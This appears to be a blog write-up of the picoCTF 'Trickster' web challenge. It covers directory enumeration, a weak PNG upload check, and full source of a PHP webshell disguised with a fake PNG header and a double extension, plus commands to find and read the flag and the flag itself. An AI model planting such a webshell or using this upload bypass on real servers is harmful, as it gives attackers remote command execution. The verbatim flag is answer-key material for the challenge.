---
title: "PicoCTF - Trickster"
author: r2cook
categories:
  - PicoCTF
tags:
  - php-webshell
  - img-ext-bypass
  - gobuster
render_with_liquid: false
media_subpath: /images/picoctf/Trickster/
image:
  path: room_card.png
---

#  Trickster

Platform: picoCTF  
Category: Web Exploration  
Difficulty: Easy / Medium 

---

## Description

I found a web app that can help process images: PNG images only!

---

## Given Files / Access

- Files: None
    
- URL: [http://atlas.picoctf.net](http://atlas.picoctf.net):port/
    
- IP: N/A
    

---

## Initial Recon / Enumeration

### Commands / Tools:
   
```shell
$ gobuster dir -u http://atlas.picoctf.net:<port>/ -w /usr/share/dirb/wordlists/big.txt
```
{: .nolineno }
### Notes:

- Discovered:
    
    - `/robots.txt` (200 OK)
        
    - `/uploads` (Forbidden / 301)
        
- `/robots.txt` pointed to `/instructions.txt`
    
`/robots.txt`

```css
User-agent: *
Disallow: /instructions.txt
Disallow: /uploads/
```

`/instructions.txt`

```css
Let's create a web app for PNG Images processing.
It needs to:
Allow users to upload PNG images
	look for ".png" extension in the submitted files
	make sure the magic bytes match (not sure what this is exactly but wikipedia says that the first few bytes contain 'PNG' in hexadecimal: "50 4E 47" )
after validation, store the uploaded files so that the admin can retrieve them later and do the necessary processing.
```

---

## Analysis

- The application allows only PNG uploads.
    
- Validation is weak:
    
    - Only checks file extension `.png`
        
    - Only checks first bytes: `50 4E 47` ("PNG" in hex)
        
- Uploaded files are stored in `/uploads/<filename>`
    

### What is happening?

The server performs **insecure file validation**:

- It does not properly verify file type
    
- It trusts file extension and magic bytes only
    

### What is the vulnerability / trick?

- **File upload bypass**
    
- We can inject a **PHP webshell disguised as a PNG file**
    
- Server executes `.php` even if `.png` is in filename
    

---

## Exploitation / Solution

1. Create a PHP webshell:
    

```php
PNG
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
</html>
```

2. Add fake PNG header:
    
    - `PNG` at the beginning to bypass validation
        
3. Rename file:
    
    - `webshell.png.php`
        
4. Upload file via the web app

5. Access uploaded shell:
    
    - `/uploads/webshell.png.php`
        
![](10_1.png){: width="800" height="400" .shadow }

6. Execute commands to find the flag:
    
    - Example:
        
        ```
        find / -name "*.txt"
        ```
        

![](10_2.png){: width="800" height="400" .shadow }

7. Read the flag file
    

```css
cat /var/www/html/MQZWCYZWGI2WE.txt
```

---

## Flag

```css
picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_d3ac625b}
```

---